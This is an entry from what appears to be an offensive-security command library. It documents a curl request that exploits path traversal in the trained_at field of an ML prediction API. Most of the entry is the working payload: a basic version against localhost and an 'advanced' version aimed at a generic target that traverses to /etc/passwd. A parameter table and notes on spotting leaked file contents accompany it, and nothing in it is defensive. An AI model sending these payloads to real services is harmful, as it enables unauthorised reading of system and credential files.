---
id: b702e5ff-bfd8-4207-9ec9-02548fcea462
name: curl-path-traversal-trained_at
type: command
executor: bash
data: >-
  curl -X POST http://localhost:8082/predict/report_weakness_id -H
  'content-type: application/json' -d'{"version":"v1", "trained_at":
  "2023-01-01T00:00:00Z/../../..", "input": [{"title": "test xss",
  "num_of_top_predictions": 3}]}'
output: null
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:32:20.698Z'
platforms:
  - Linux
  - Docker
tags:
  - path-traversal
  - exploit
verified: false
validated: true
submitted: true
---

# curl-path-traversal-trained_at

## Command

```bash
curl -X POST http://localhost:8082/predict/report_weakness_id -H 'content-type: application/json' -d'{"version":"v1", "trained_at": "2023-01-01T00:00:00Z/../../..", "input": [{"title": "test xss", "num_of_top_predictions": 3}]}'
```

## Description

This command sends a POST request to exploit path traversal in the trained_at parameter of the ML API endpoint, injecting '../' sequences to access arbitrary files.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | Specifies HTTP POST method | Yes |
| `http://localhost:8082/predict/report_weakness_id` | Target vulnerable endpoint | Yes |
| `-H 'content-type: application/json'` | Sets JSON content type header | Yes |
| `-d'{...}'` | JSON payload with traversal in trained_at | Yes |

## Examples

### Basic Usage

```bash
curl -X POST http://localhost:8082/predict/report_weakness_id -H 'content-type: application/json' -d'{"version":"v1", "trained_at": "2023-01-01T00:00:00Z/../../..", "input": [{"title": "test xss", "num_of_top_predictions": 3}]}'
```

### Advanced Usage

Adapt the URL and payload for different traversal depths or targets:

```bash
curl -X POST http://target:8082/predict/report_weakness_id -H 'content-type: application/json' -d'{"version":"v1", "trained_at": "2023-01-01T00:00:00Z/../../../../etc/passwd", "input": [{"title": "test", "num_of_top_predictions": 3}]}' -v
```

## Expected Output

API response may include errors like file not found from traversed path or leaked contents if successful, e.g., JSON with prediction data or traceback revealing path resolution.

## Related

- [[commands/curl-path-traversal-version]]
- [[procedures/Exploit-Path-Traversal-via-trained_at]]
